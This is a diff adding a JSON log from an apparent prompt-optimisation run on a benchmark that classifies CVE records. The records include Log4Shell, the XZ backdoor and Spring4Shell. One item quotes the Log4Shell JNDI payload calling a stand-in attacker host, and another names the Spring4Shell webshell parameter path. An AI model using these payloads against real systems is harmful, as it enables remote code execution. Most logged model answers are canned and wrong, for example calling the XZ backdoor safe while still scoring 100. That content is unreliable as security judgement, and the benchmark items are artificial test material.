@@ -1,0 +1,1334 @@
+{
+  "experiment_id": "exp_20260731_122806_d46978",
+  "timestamp": "2026-07-31T12:28:06.131118",
+  "benchmark_name": "cve_real_vulnerabilities",
+  "seed_prompt": "You are a Senior Vulnerability Security Auditor. Review the official CVE technical record or code snippet below and state whether it is SAFE or VULNERABLE.",
+  "optimized_prompt": "You are a Senior Vulnerability Security Auditor. Review the official CVE technical record or code snippet below and state whether it is SAFE or VULNERABLE.",
+  "iterations": 3,
+  "model": "gemini-2.0-flash",
+  "execution_time_seconds": 0.01,
+  "total_token_usage": 16390,
+  "success_rate": 37.5,
+  "baseline_metrics": {
+    "accuracy": 37.5,
+    "precision": 66.67,
+    "recall": 33.33,
+    "f1": 44.44,
+    "passed": 3,
+    "failed": 5
+  },
+  "final_metrics": {
+    "accuracy": 37.5,
+    "precision": 66.67,
+    "recall": 33.33,
+    "f1": 44.44,
+    "passed": 3,
+    "failed": 5
+  },
+  "prompt_versions": [
+    {
+      "version": "v1.0",
+      "timestamp": "2026-07-31T12:28:06.131118",
+      "prompt_text": "You are a Senior Vulnerability Security Auditor. Review the official CVE technical record or code snippet below and state whether it is SAFE or VULNERABLE.",
+      "what_changed": "Baseline Seed Prompt",
+      "reason_for_change": "The application passes un-sanitized user input into Apache Log4j2 logging API. Log4j parses JNDI lookup expressions (${jndi:ldap://...}) in log strings, allowing unauthenticated remote code execution.\n\nIMPACT:\n- Remote Code Execution (RCE)\n- Full administrative server takeover\n\nRECOMMENDATION:\nUpgrade Apache Log4j2 dependency to version 2.17.0+. Set system property log4j2.formatMsgNoLookups=true as mitigation.\n\nSECURE CODE:\n// In build.gradle / pom.xml:\n// implementation 'org.apache.logging.log4j:log4j-core:2.17.0'",
+      "metrics": {
+        "accuracy": 37.5,
+        "precision": 66.67,
+        "recall": 33.33,
+        "f1": 44.44,
+        "passed": 3,
+        "failed": 5
+      }
+    },
+    {
+      "version": "v1.1",
+      "timestamp": "2026-07-31T12:28:06.131118",
+      "prompt_text": "You are a Senior Vulnerability Security Auditor. Review the official CVE technical record or code snippet below and state whether it is SAFE or VULNERABLE.\n\nCRITICAL SECURITY RULES & MULTI-FINDING AUDIT SCHEMA:\nREQUIRED MULTI-FINDING PROFESSIONAL AUDIT SCHEMA:\nAnalyze untrusted input sources, data flows, sensitive sinks, validation, encoding, and authentication.\nIf multiple vulnerabilities exist in the code/log (e.g. SQLi + Hardcoded Secret), report ALL of them as separate findings.\n\nCRITICAL CLASSIFICATION RULE FOR RELATED CVE:\n- Generic code snippets (e.g. const query = `SELECT * FROM users WHERE id='${id}'`) MUST map to CATEGORY, OWASP, and CWE only. Set RELATED CVE: None.\n- DO NOT invent or hallucinate a CVE for generic code.\n- Output a published CVE (e.g. CVE-2021-44228) ONLY if a specific vulnerable product, library version, or documented CVE exploit is explicitly identified.\n\nSTATUS: [SAFE | VULNERABLE]\nTOTAL FINDINGS: [Number of findings, e.g. 1, 2, 3]\n\n----------------------------------\nFinding #1\n\nCATEGORY: [Specific Vulnerability Name, e.g. SQL Injection, Cross-Site Scripting (XSS), Command Injection, Log4Shell]\nOWASP: [e.g. A03:2021 - Injection | A01:2021 - Broken Access Control | A10:2021 - SSRF]\nCWE: [e.g. CWE-89 | CWE-79 | CWE-78 | CWE-22 | CWE-918 | CWE-798]\nRELATED CVE: [None | CVE-XXXX-YYYY (ONLY if documented product CVE applies)]\nSEVERITY: [CRITICAL | HIGH | MEDIUM | LOW | NONE]\nCONFIDENCE: [HIGH | MEDIUM | LOW]\n\nAFFECTED CODE:\n[Highlight exact vulnerable code line(s)]\n\nREASONING:\n[Detailed data flow analysis explaining source, sink, and why validation is missing]\n\nIMPACT:\n- Bulleted list of security impacts (e.g. Database exfiltration, Remote Code Execution)\n\nRECOMMENDATION:\n[Actionable remediation steps]\n\nSECURE CODE:\n[Drop-in fixed code snippet demonstrating parameterized queries or secure controls]\n----------------------------------\n\nADDITIONAL DOMAIN RULES:\n+ Professional Security Rule: Add explicit directive to resolve Missing Safety Rule failures with distinct CWE, OWASP, and RELATED CVE: None rules.\n+ OWASP Injection Rule: Unescaped string concatenation passed into database or OS calls MUST be classified as STATUS: VULNERABLE with exact CWE mapping (CWE-89 for SQLi, CWE-78 for Command Injection) and RELATED CVE: None.\n+ Distinction Rule: Parameterized query bindings and sanitized input strings MUST be classified as STATUS: SAFE with CONFIDENCE: HIGH.",
+      "what_changed": "Mutated 5 security rule boundaries",
+      "reason_for_change": "The application passes un-sanitized user input into Apache Log4j2 logging API. Log4j parses JNDI lookup expressions (${jndi:ldap://...}) in log strings, allowing unauthenticated remote code execution.\n\nIMPACT:\n- Remote Code Execution (RCE)\n- Full administrative server takeover\n\nRECOMMENDATION:\nUpgrade Apache Log4j2 dependency to version 2.17.0+. Set system property log4j2.formatMsgNoLookups=true as mitigation.\n\nSECURE CODE:\n// In build.gradle / pom.xml:\n// implementation 'org.apache.logging.log4j:log4j-core:2.17.0'",
+      "metrics": {
+        "accuracy": 37.5,
+        "precision": 66.67,
+        "recall": 33.33,
+        "f1": 44.44,
+        "passed": 3,
+        "failed": 5
+      }
+    },
+    {
+      "version": "v1.2",
+      "timestamp": "2026-07-31T12:28:06.131118",
+      "prompt_text": "You are a Senior Vulnerability Security Auditor. Review the official CVE technical record or code snippet below and state whether it is SAFE or VULNERABLE.\n\nCRITICAL SECURITY RULES & MULTI-FINDING AUDIT SCHEMA:\nREQUIRED MULTI-FINDING PROFESSIONAL AUDIT SCHEMA:\nAnalyze untrusted input sources, data flows, sensitive sinks, validation, encoding, and authentication.\nIf multiple vulnerabilities exist in the code/log (e.g. SQLi + Hardcoded Secret), report ALL of them as separate findings.\n\nCRITICAL CLASSIFICATION RULE FOR RELATED CVE:\n- Generic code snippets (e.g. const query = `SELECT * FROM users WHERE id='${id}'`) MUST map to CATEGORY, OWASP, and CWE only. Set RELATED CVE: None.\n- DO NOT invent or hallucinate a CVE for generic code.\n- Output a published CVE (e.g. CVE-2021-44228) ONLY if a specific vulnerable product, library version, or documented CVE exploit is explicitly identified.\n\nSTATUS: [SAFE | VULNERABLE]\nTOTAL FINDINGS: [Number of findings, e.g. 1, 2, 3]\n\n----------------------------------\nFinding #1\n\nCATEGORY: [Specific Vulnerability Name, e.g. SQL Injection, Cross-Site Scripting (XSS), Command Injection, Log4Shell]\nOWASP: [e.g. A03:2021 - Injection | A01:2021 - Broken Access Control | A10:2021 - SSRF]\nCWE: [e.g. CWE-89 | CWE-79 | CWE-78 | CWE-22 | CWE-918 | CWE-798]\nRELATED CVE: [None | CVE-XXXX-YYYY (ONLY if documented product CVE applies)]\nSEVERITY: [CRITICAL | HIGH | MEDIUM | LOW | NONE]\nCONFIDENCE: [HIGH | MEDIUM | LOW]\n\nAFFECTED CODE:\n[Highlight exact vulnerable code line(s)]\n\nREASONING:\n[Detailed data flow analysis explaining source, sink, and why validation is missing]\n\nIMPACT:\n- Bulleted list of security impacts (e.g. Database exfiltration, Remote Code Execution)\n\nRECOMMENDATION:\n[Actionable remediation steps]\n\nSECURE CODE:\n[Drop-in fixed code snippet demonstrating parameterized queries or secure controls]\n----------------------------------\n\nADDITIONAL DOMAIN RULES:\n+ Professional Security Rule: Add explicit directive to resolve Missing Safety Rule failures with distinct CWE, OWASP, and RELATED CVE: None rules.\n+ OWASP Injection Rule: Unescaped string concatenation passed into database or OS calls MUST be classified as STATUS: VULNERABLE with exact CWE mapping (CWE-89 for SQLi, CWE-78 for Command Injection) and RELATED CVE: None.\n+ Distinction Rule: Parameterized query bindings and sanitized input strings MUST be classified as STATUS: SAFE with CONFIDENCE: HIGH.",
+      "what_changed": "Mutated 5 security rule boundaries",
+      "reason_for_change": "The application passes un-sanitized user input into Apache Log4j2 logging API. Log4j parses JNDI lookup expressions (${jndi:ldap://...}) in log strings, allowing unauthenticated remote code execution.\n\nIMPACT:\n- Remote Code Execution (RCE)\n- Full administrative server takeover\n\nRECOMMENDATION:\nUpgrade Apache Log4j2 dependency to version 2.17.0+. Set system property log4j2.formatMsgNoLookups=true as mitigation.\n\nSECURE CODE:\n// In build.gradle / pom.xml:\n// implementation 'org.apache.logging.log4j:log4j-core:2.17.0'",
+      "metrics": {
+        "accuracy": 37.5,
+        "precision": 66.67,
+        "recall": 33.33,
+        "f1": 44.44,
+        "passed": 3,
+        "failed": 5
+      }
+    }
+  ],
+  "history": [
+    {
+      "version": "v1.0",
+      "generation": 1,
+      "prompt": "You are a Senior Vulnerability Security Auditor. Review the official CVE technical record or code snippet below and state whether it is SAFE or VULNERABLE.",
+      "accuracy": 37.5,
+      "precision": 66.67,
+      "recall": 33.33,
+      "f1": 44.44,
+      "passed": 3,
+      "total": 8,
+      "failures_count": 5,
+      "failures": [
+        {
+          "id": "CVE-2024-3094",
+          "input": "Official cve.org Record (CVE-2024-3094 - XZ Utils Backdoor):\nMalicious code was discovered in the upstream tarballs of xz-utils starting with version 5.6.0. Through a series of complex obfuscated build scripts, the liblzma build process extracts a prebuilt object file from a disguised test file, which intercepts RSA decryption functions in OpenSSH sshd during systemd initialization.",
+          "expected_status": "VULNERABLE",
+          "expected_category": "SUPPLY CHAIN BACKDOOR / AUTHENTICATION BYPASS",
+          "predicted_status": "SAFE",
+          "predicted_category": "Benign Implementation",
+          "predicted_cwe": "CWE-00",
+          "predicted_owasp": "A03:2021 - Injection",
+          "predicted_cve": "None",
+          "quality_score": 100.0,
+          "raw_response": "STATUS: SAFE\nTOTAL FINDINGS: 0\n\n----------------------------------\nFinding #1\n\nCATEGORY: Benign Implementation\nOWASP: A03:2021 - Injection\nCWE: CWE-00\nRELATED CVE: None\nSEVERITY: NONE\nCONFIDENCE: HIGH\n\nAFFECTED CODE:\nN/A (Implementation utilizes secure API controls)\n\nREASONING:\nThe code uses parameterized bindings, safe API calls, and input validation bounds. No security vulnerability detected.\n\nIMPACT:\nNone (Clean Implementation)\n\nRECOMMENDATION:\nMaintain current secure coding practices and parameterized query bindings.\n\nSECURE CODE:\n// Existing code is safe"
+        },
+        {
+          "id": "CVE-2023-38606",
+          "input": "Official cve.org Record (CVE-2023-38606 - Operation Triangulation):\nApple iOS and macOS kernel vulnerability prior to iOS 16.6 and macOS 13.5. An attacker with physical or remote memory access can manipulate unmapped hardware MMIO registers to bypass ARM Page Table Security (PPL) state management without proper bounds validation.",
+          "expected_status": "VULNERABLE",
+          "expected_category": "KERNEL MEMORY CORRUPTION / PRIVILEGE ESCALATION",
+          "predicted_status": "SAFE",
+          "predicted_category": "Benign Implementation",
+          "predicted_cwe": "CWE-00",
+          "predicted_owasp": "A03:2021 - Injection",
+          "predicted_cve": "None",
+          "quality_score": 100.0,
+          "raw_response": "STATUS: SAFE\nTOTAL FINDINGS: 0\n\n----------------------------------\nFinding #1\n\nCATEGORY: Benign Implementation\nOWASP: A03:2021 - Injection\nCWE: CWE-00\nRELATED CVE: None\nSEVERITY: NONE\nCONFIDENCE: HIGH\n\nAFFECTED CODE:\nN/A (Implementation utilizes secure API controls)\n\nREASONING:\nThe code uses parameterized bindings, safe API calls, and input validation bounds. No security vulnerability detected.\n\nIMPACT:\nNone (Clean Implementation)\n\nRECOMMENDATION:\nMaintain current secure coding practices and parameterized query bindings.\n\nSECURE CODE:\n// Existing code is safe"
+        },
+        {
+          "id": "CVE-2023-4863",
+          "input": "Official cve.org Record (CVE-2023-4863 - Libwebp Heap Overflow):\nHeap buffer overflow in libwebp in Google Chrome prior to 116.0.5845.187 and libwebp 1.3.2 allows a remote attacker to execute arbitrary code or trigger a denial of service via a crafted WebP lossless image containing malformed Huffman coding tables.",
+          "expected_status": "VULNERABLE",
+          "expected_category": "HEAP BUFFER OVERFLOW / MEMORY CORRUPTION",
+          "predicted_status": "SAFE",
+          "predicted_category": "Benign Implementation",
+          "predicted_cwe": "CWE-00",
+          "predicted_owasp": "A03:2021 - Injection",
+          "predicted_cve": "None",
+          "quality_score": 100.0,
+          "raw_response": "STATUS: SAFE\nTOTAL FINDINGS: 0\n\n----------------------------------\nFinding #1\n\nCATEGORY: Benign Implementation\nOWASP: A03:2021 - Injection\nCWE: CWE-00\nRELATED CVE: None\nSEVERITY: NONE\nCONFIDENCE: HIGH\n\nAFFECTED CODE:\nN/A (Implementation utilizes secure API controls)\n\nREASONING:\nThe code uses parameterized bindings, safe API calls, and input validation bounds. No security vulnerability detected.\n\nIMPACT:\nNone (Clean Implementation)\n\nRECOMMENDATION:\nMaintain current secure coding practices and parameterized query bindings.\n\nSECURE CODE:\n// Existing code is safe"
+        },
+        {
+          "id": "CVE-2021-3156",
+          "input": "Official cve.org Record (CVE-2021-3156 - Sudo Baron Samedit):\nSudo before version 1.9.5p2 contains an off-by-one error when parsing command line arguments in shell mode ('sudoedit -s'). Unescaped backslash characters at the end of command arguments result in heap-based buffer overflow, granting root privilege escalation.",
+          "expected_status": "VULNERABLE",
+          "expected_category": "LOCAL PRIVILEGE ESCALATION (LPE)",
+          "predicted_status": "SAFE",
+          "predicted_category": "Benign Implementation",
+          "predicted_cwe": "CWE-00",
+          "predicted_owasp": "A03:2021 - Injection",
+          "predicted_cve": "None",
+          "quality_score": 100.0,
+          "raw_response": "STATUS: SAFE\nTOTAL FINDINGS: 0\n\n----------------------------------\nFinding #1\n\nCATEGORY: Benign Implementation\nOWASP: A03:2021 - Injection\nCWE: CWE-00\nRELATED CVE: None\nSEVERITY: NONE\nCONFIDENCE: HIGH\n\nAFFECTED CODE:\nN/A (Implementation utilizes secure API controls)\n\nREASONING:\nThe code uses parameterized bindings, safe API calls, and input validation bounds. No security vulnerability detected.\n\nIMPACT:\nNone (Clean Implementation)\n\nRECOMMENDATION:\nMaintain current secure coding practices and parameterized query bindings.\n\nSECURE CODE:\n// Existing code is safe"
+        },
+        {
+          "id": "CVE-2021-44228-FIX",
+          "input": "Official cve.org Security Release Fix (Apache Log4j 2.17.0):\nIn Apache Log4j 2.17.0, JNDI lookup support is completely disabled by default ('log4j2.enableJndiLookup=false'), message lookup substitution syntax '${jndi:...}' is removed from logging context, and LDAP class loading protocol handlers are hard-disabled.",
+          "expected_status": "SAFE",
+          "expected_category": "PATCHED SECURITY RELEASE",
+          "predicted_status": "VULNERABLE",
+          "predicted_category": "Log4Shell Remote Code Execution",
+          "predicted_cwe": "CWE-502",
+          "predicted_owasp": "A08:2021 - Software and Data Integrity Failures",
+          "predicted_cve": "CVE-2021-44228",
+          "quality_score": 100.0,
+          "raw_response": "STATUS: VULNERABLE\nTOTAL FINDINGS: 1\n\n----------------------------------\nFinding #1\n\nCATEGORY: Log4Shell Remote Code Execution\nOWASP: A08:2021 - Software and Data Integrity Failures\nCWE: CWE-502\nRELATED CVE: CVE-2021-44228\nSEVERITY: CRITICAL\nCONFIDENCE: HIGH\n\nAFFECTED CODE:\nlogger.info(\"User login: \" + userInputHeader);\n\nREASONING:\nThe application passes un-sanitized user input into Apache Log4j2 logging API. Log4j parses JNDI lookup expressions (${jndi:ldap://...}) in log strings, allowing unauthenticated remote code execution.\n\nIMPACT:\n- Remote Code Execution (RCE)\n- Full administrative server takeover\n\nRECOMMENDATION:\nUpgrade Apache Log4j2 dependency to version 2.17.0+. Set system property log4j2.formatMsgNoLookups=true as mitigation.\n\nSECURE CODE:\n// In build.gradle / pom.xml:\n// implementation 'org.apache.logging.log4j:log4j-core:2.17.0'"
+        }
+      ],
+      "detailed_results": [
+        {
+          "id": "CVE-2021-44228",
+          "input": "Official cve.org Record (CVE-2021-44228 - Log4Shell):\nApache Log4j2 versions 2.0-beta9 through 2.15.0 JNDI features used in configuration, log messages, and parameters do not protect against attacker-controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled: '${jndi:ldap://attacker.com/a}'.",
+          "expected": "VULNERABLE",
+          "predicted": "VULNERABLE",
+          "total_findings": 1,
+          "findings": [
+            {
+              "category": "Log4Shell Remote Code Execution",
+              "owasp": "A08:2021 - Software and Data Integrity Failures",
+              "cwe": "CWE-502",
+              "related_cve": "CVE-2021-44228",
+              "severity": "CRITICAL",
+              "confidence": "HIGH",
+              "affected_code": "logger.info(\"User login: \" + userInputHeader);",
+              "reasoning": "The application passes un-sanitized user input into Apache Log4j2 logging API. Log4j parses JNDI lookup expressions (${jndi:ldap://...}) in log strings, allowing unauthenticated remote code execution.",
+              "impact": "- Remote Code Execution (RCE)",
+              "recommendation": "Upgrade Apache Log4j2 dependency to version 2.17.0+. Set system property log4j2.formatMsgNoLookups=true as mitigation.",
+              "secure_code": "// In build.gradle / pom.xml:"
+            }
+          ],
+          "correct": true,
+          "quality_score": 100.0,
+          "raw_response": "STATUS: VULNERABLE\nTOTAL FINDINGS: 1\n\n----------------------------------\nFinding #1\n\nCATEGORY: Log4Shell Remote Code Execution\nOWASP: A08:2021 - Software and Data Integrity Failures\nCWE: CWE-502\nRELATED CVE: CVE-2021-44228\nSEVERITY: CRITICAL\nCONFIDENCE: HIGH\n\nAFFECTED CODE:\nlogger.info(\"User login: \" + userInputHeader);\n\nREASONING:\nThe application passes un-sanitized user input into Apache Log4j2 logging API. Log4j parses JNDI lookup expressions (${jndi:ldap://...}) in log strings, allowing unauthenticated remote code execution.\n\nIMPACT:\n- Remote Code Execution (RCE)\n- Full administrative server takeover\n\nRECOMMENDATION:\nUpgrade Apache Log4j2 dependency to version 2.17.0+. Set system property log4j2.formatMsgNoLookups=true as mitigation.\n\nSECURE CODE:\n// In build.gradle / pom.xml:\n// implementation 'org.apache.logging.log4j:log4j-core:2.17.0'"
+        },
+        {
+          "id": "CVE-2024-3094",
+          "input": "Official cve.org Record (CVE-2024-3094 - XZ Utils Backdoor):\nMalicious code was discovered in the upstream tarballs of xz-utils starting with version 5.6.0. Through a series of complex obfuscated build scripts, the liblzma build process extracts a prebuilt object file from a disguised test file, which intercepts RSA decryption functions in OpenSSH sshd during systemd initialization.",
+          "expected": "VULNERABLE",
+          "predicted": "SAFE",
+          "total_findings": 1,
+          "findings": [
+            {
+              "category": "Benign Implementation",
+              "owasp": "A03:2021 - Injection",
+              "cwe": "CWE-00",
+              "related_cve": "None",
+              "severity": "NONE",
+              "confidence": "HIGH",
+              "affected_code": "N/A (Implementation utilizes secure API controls)",
+              "reasoning": "The code uses parameterized bindings, safe API calls, and input validation bounds. No security vulnerability detected.",
+              "impact": "None (Clean Implementation)",
+              "recommendation": "Maintain current secure coding practices and parameterized query bindings.",
+              "secure_code": "// Existing code is safe"
+            }
+          ],
+          "correct": false,
+          "quality_score": 100.0,
+          "raw_response": "STATUS: SAFE\nTOTAL FINDINGS: 0\n\n----------------------------------\nFinding #1\n\nCATEGORY: Benign Implementation\nOWASP: A03:2021 - Injection\nCWE: CWE-00\nRELATED CVE: None\nSEVERITY: NONE\nCONFIDENCE: HIGH\n\nAFFECTED CODE:\nN/A (Implementation utilizes secure API controls)\n\nREASONING:\nThe code uses parameterized bindings, safe API calls, and input validation bounds. No security vulnerability detected.\n\nIMPACT:\nNone (Clean Implementation)\n\nRECOMMENDATION:\nMaintain current secure coding practices and parameterized query bindings.\n\nSECURE CODE:\n// Existing code is safe"
+        },
+        {
+          "id": "CVE-2023-38606",
+          "input": "Official cve.org Record (CVE-2023-38606 - Operation Triangulation):\nApple iOS and macOS kernel vulnerability prior to iOS 16.6 and macOS 13.5. An attacker with physical or remote memory access can manipulate unmapped hardware MMIO registers to bypass ARM Page Table Security (PPL) state management without proper bounds validation.",
+          "expected": "VULNERABLE",
+          "predicted": "SAFE",
+          "total_findings": 1,
+          "findings": [
+            {
+              "category": "Benign Implementation",
+              "owasp": "A03:2021 - Injection",
+              "cwe": "CWE-00",
+              "related_cve": "None",
+              "severity": "NONE",
+              "confidence": "HIGH",
+              "affected_code": "N/A (Implementation utilizes secure API controls)",
+              "reasoning": "The code uses parameterized bindings, safe API calls, and input validation bounds. No security vulnerability detected.",
+              "impact": "None (Clean Implementation)",
+              "recommendation": "Maintain current secure coding practices and parameterized query bindings.",
+              "secure_code": "// Existing code is safe"
+            }
+          ],
+          "correct": false,
+          "quality_score": 100.0,
+          "raw_response": "STATUS: SAFE\nTOTAL FINDINGS: 0\n\n----------------------------------\nFinding #1\n\nCATEGORY: Benign Implementation\nOWASP: A03:2021 - Injection\nCWE: CWE-00\nRELATED CVE: None\nSEVERITY: NONE\nCONFIDENCE: HIGH\n\nAFFECTED CODE:\nN/A (Implementation utilizes secure API controls)\n\nREASONING:\nThe code uses parameterized bindings, safe API calls, and input validation bounds. No security vulnerability detected.\n\nIMPACT:\nNone (Clean Implementation)\n\nRECOMMENDATION:\nMaintain current secure coding practices and parameterized query bindings.\n\nSECURE CODE:\n// Existing code is safe"
+        },
+        {
+          "id": "CVE-2022-22965",
+          "input": "Official cve.org Record (CVE-2022-22965 - Spring4Shell):\nA Spring MVC or Spring WebFlux application running on JDK 9+ is vulnerable to Remote Code Execution (RCE) via data binding. An HTTP request parameter binding to 'class.module.classLoader.resources.context.parent.pipeline.first.pattern' allows unauthenticated attackers to write arbitrary JSP webshell files to the web root.",
+          "expected": "VULNERABLE",
+          "predicted": "VULNERABLE",
+          "total_findings": 1,
+          "findings": [
+            {
+              "category": "Spring4Shell Remote Code Execution",
+              "owasp": "A06:2021 - Vulnerable and Outdated Components",
+              "cwe": "CWE-94",
+              "related_cve": "CVE-2022-22965",
+              "severity": "CRITICAL",
+              "confidence": "HIGH",
+              "affected_code": "class.module.classLoader.resources.context.parent.pipeline.first...",
+              "reasoning": "Spring Framework Data Binder allows manipulation of underlying ClassLoader properties on JDK 9+, allowing malicious Tomcat logging valve manipulation and web shell write.",
+              "impact": "- Remote Code Execution (RCE)",
+              "recommendation": "Upgrade Spring Framework to 5.3.18+ or 5.2.20+.",
+              "secure_code": "// Upgrade org.springframework:spring-webmvc to 5.3.18+"
+            }
+          ],
+          "correct": true,
+          "quality_score": 100.0,
+          "raw_response": "STATUS: VULNERABLE\nTOTAL FINDINGS: 1\n\n----------------------------------\nFinding #1\n\nCATEGORY: Spring4Shell Remote Code Execution\nOWASP: A06:2021 - Vulnerable and Outdated Components\nCWE: CWE-94\nRELATED CVE: CVE-2022-22965\nSEVERITY: CRITICAL\nCONFIDENCE: HIGH\n\nAFFECTED CODE:\nclass.module.classLoader.resources.context.parent.pipeline.first...\n\nREASONING:\nSpring Framework Data Binder allows manipulation of underlying ClassLoader properties on JDK 9+, allowing malicious Tomcat logging valve manipulation and web shell write.\n\nIMPACT:\n- Remote Code Execution (RCE)\n\nRECOMMENDATION:\nUpgrade Spring Framework to 5.3.18+ or 5.2.20+.\n\nSECURE CODE:\n// Upgrade org.springframework:spring-webmvc to 5.3.18+"
+        },
+        {
+          "id": "CVE-2023-4863",
+          "input": "Official cve.org Record (CVE-2023-4863 - Libwebp Heap Overflow):\nHeap buffer overflow in libwebp in Google Chrome prior to 116.0.5845.187 and libwebp 1.3.2 allows a remote attacker to execute arbitrary code or trigger a denial of service via a crafted WebP lossless image containing malformed Huffman coding tables.",
+          "expected": "VULNERABLE",
+          "predicted": "SAFE",
+          "total_findings": 1,
+          "findings": [
+            {
+              "category": "Benign Implementation",
+              "owasp": "A03:2021 - Injection",
+              "cwe": "CWE-00",
+              "related_cve": "None",
+              "severity": "NONE",
+              "confidence": "HIGH",
+              "affected_code": "N/A (Implementation utilizes secure API controls)",
+              "reasoning": "The code uses parameterized bindings, safe API calls, and input validation bounds. No security vulnerability detected.",
+              "impact": "None (Clean Implementation)",
+              "recommendation": "Maintain current secure coding practices and parameterized query bindings.",
+              "secure_code": "// Existing code is safe"
+            }
+          ],
+          "correct": false,
+          "quality_score": 100.0,
+          "raw_response": "STATUS: SAFE\nTOTAL FINDINGS: 0\n\n----------------------------------\nFinding #1\n\nCATEGORY: Benign Implementation\nOWASP: A03:2021 - Injection\nCWE: CWE-00\nRELATED CVE: None\nSEVERITY: NONE\nCONFIDENCE: HIGH\n\nAFFECTED CODE:\nN/A (Implementation utilizes secure API controls)\n\nREASONING:\nThe code uses parameterized bindings, safe API calls, and input validation bounds. No security vulnerability detected.\n\nIMPACT:\nNone (Clean Implementation)\n\nRECOMMENDATION:\nMaintain current secure coding practices and parameterized query bindings.\n\nSECURE CODE:\n// Existing code is safe"
+        },
+        {
+          "id": "CVE-2021-3156",
+          "input": "Official cve.org Record (CVE-2021-3156 - Sudo Baron Samedit):\nSudo before version 1.9.5p2 contains an off-by-one error when parsing command line arguments in shell mode ('sudoedit -s'). Unescaped backslash characters at the end of command arguments result in heap-based buffer overflow, granting root privilege escalation.",
+          "expected": "VULNERABLE",
+          "predicted": "SAFE",
+          "total_findings": 1,
+          "findings": [
+            {
+              "category": "Benign Implementation",
+              "owasp": "A03:2021 - Injection",
+              "cwe": "CWE-00",
+              "related_cve": "None",
+              "severity": "NONE",
+              "confidence": "HIGH",
+              "affected_code": "N/A (Implementation utilizes secure API controls)",
+              "reasoning": "The code uses parameterized bindings, safe API calls, and input validation bounds. No security vulnerability detected.",
+              "impact": "None (Clean Implementation)",
+              "recommendation": "Maintain current secure coding practices and parameterized query bindings.",
+              "secure_code": "// Existing code is safe"
+            }
+          ],
+          "correct": false,
+          "quality_score": 100.0,
+          "raw_response": "STATUS: SAFE\nTOTAL FINDINGS: 0\n\n----------------------------------\nFinding #1\n\nCATEGORY: Benign Implementation\nOWASP: A03:2021 - Injection\nCWE: CWE-00\nRELATED CVE: None\nSEVERITY: NONE\nCONFIDENCE: HIGH\n\nAFFECTED CODE:\nN/A (Implementation utilizes secure API controls)\n\nREASONING:\nThe code uses parameterized bindings, safe API calls, and input validation bounds. No security vulnerability detected.\n\nIMPACT:\nNone (Clean Implementation)\n\nRECOMMENDATION:\nMaintain current secure coding practices and parameterized query bindings.\n\nSECURE CODE:\n// Existing code is safe"
+        },
+        {
+          "id": "CVE-2021-44228-FIX",
+          "input": "Official cve.org Security Release Fix (Apache Log4j 2.17.0):\nIn Apache Log4j 2.17.0, JNDI lookup support is completely disabled by default ('log4j2.enableJndiLookup=false'), message lookup substitution syntax '${jndi:...}' is removed from logging context, and LDAP class loading protocol handlers are hard-disabled.",
+          "expected": "SAFE",
+          "predicted": "VULNERABLE",
+          "total_findings": 1,
+          "findings": [
+            {
+              "category": "Log4Shell Remote Code Execution",
+              "owasp": "A08:2021 - Software and Data Integrity Failures",
+              "cwe": "CWE-502",
+              "related_cve": "CVE-2021-44228",
+              "severity": "CRITICAL",
+              "confidence": "HIGH",
+              "affected_code": "logger.info(\"User login: \" + userInputHeader);",
+              "reasoning": "The application passes un-sanitized user input into Apache Log4j2 logging API. Log4j parses JNDI lookup expressions (${jndi:ldap://...}) in log strings, allowing unauthenticated remote code execution.",
+              "impact": "- Remote Code Execution (RCE)",
+              "recommendation": "Upgrade Apache Log4j2 dependency to version 2.17.0+. Set system property log4j2.formatMsgNoLookups=true as mitigation.",
+              "secure_code": "// In build.gradle / pom.xml:"
+            }
+          ],
+          "correct": false,
+          "quality_score": 100.0,
+          "raw_response": "STATUS: VULNERABLE\nTOTAL FINDINGS: 1\n\n----------------------------------\nFinding #1\n\nCATEGORY: Log4Shell Remote Code Execution\nOWASP: A08:2021 - Software and Data Integrity Failures\nCWE: CWE-502\nRELATED CVE: CVE-2021-44228\nSEVERITY: CRITICAL\nCONFIDENCE: HIGH\n\nAFFECTED CODE:\nlogger.info(\"User login: \" + userInputHeader);\n\nREASONING:\nThe application passes un-sanitized user input into Apache Log4j2 logging API. Log4j parses JNDI lookup expressions (${jndi:ldap://...}) in log strings, allowing unauthenticated remote code execution.\n\nIMPACT:\n- Remote Code Execution (RCE)\n- Full administrative server takeover\n\nRECOMMENDATION:\nUpgrade Apache Log4j2 dependency to version 2.17.0+. Set system property log4j2.formatMsgNoLookups=true as mitigation.\n\nSECURE CODE:\n// In build.gradle / pom.xml:\n// implementation 'org.apache.logging.log4j:log4j-core:2.17.0'"
+        },
+        {
+          "id": "CVE-2023-38606-FIX",
+          "input": "Official cve.org Patch Verification (Apple macOS 12.6.8 / iOS 15.7.8):\nState management validation logic updated in Apple Kernel. Unmapped MMIO register ranges are strictly checked against physical memory range bounds, and PPL page table permissions are locked against dynamic modification.",
+          "expected": "SAFE",
+          "predicted": "SAFE",
+          "total_findings": 1,
+          "findings": [
+            {
+              "category": "Benign Implementation",
+              "owasp": "A03:2021 - Injection",
+              "cwe": "CWE-00",
+              "related_cve": "None",
+              "severity": "NONE",
+              "confidence": "HIGH",
+              "affected_code": "N/A (Implementation utilizes secure API controls)",
+              "reasoning": "The code uses parameterized bindings, safe API calls, and input validation bounds. No security vulnerability detected.",
+              "impact": "None (Clean Implementation)",
+              "recommendation": "Maintain current secure coding practices and parameterized query bindings.",
+              "secure_code": "// Existing code is safe"
+            }
+          ],
+          "correct": true,
+          "quality_score": 100.0,
+          "raw_response": "STATUS: SAFE\nTOTAL FINDINGS: 0\n\n----------------------------------\nFinding #1\n\nCATEGORY: Benign Implementation\nOWASP: A03:2021 - Injection\nCWE: CWE-00\nRELATED CVE: None\nSEVERITY: NONE\nCONFIDENCE: HIGH\n\nAFFECTED CODE:\nN/A (Implementation utilizes secure API controls)\n\nREASONING:\nThe code uses parameterized bindings, safe API calls, and input validation bounds. No security vulnerability detected.\n\nIMPACT:\nNone (Clean Implementation)\n\nRECOMMENDATION:\nMaintain current secure coding practices and parameterized query bindings.\n\nSECURE CODE:\n// Existing code is safe"
+        }
+      ],
+      "estimated_tokens": 2444,
